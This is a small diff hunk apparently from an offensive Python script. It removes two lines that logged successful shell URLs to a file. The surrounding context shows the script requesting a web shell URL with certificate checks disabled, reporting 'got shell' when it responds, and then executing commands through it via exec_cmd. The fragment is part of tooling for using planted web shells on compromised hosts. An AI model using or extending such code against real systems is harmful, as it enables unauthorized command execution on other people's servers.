@@ -387,8 +387,6 @@ def main():
         f = requests.get(f"{shell_url}", verify=False)
         if f.status_code == 200:
             print(f"got shell {f}")
-            with open('good.txt', 'a+') as files:
-                files.write(f"{shell_url}\n")
             try:
                 exec_cmd(shell_url)
             except:
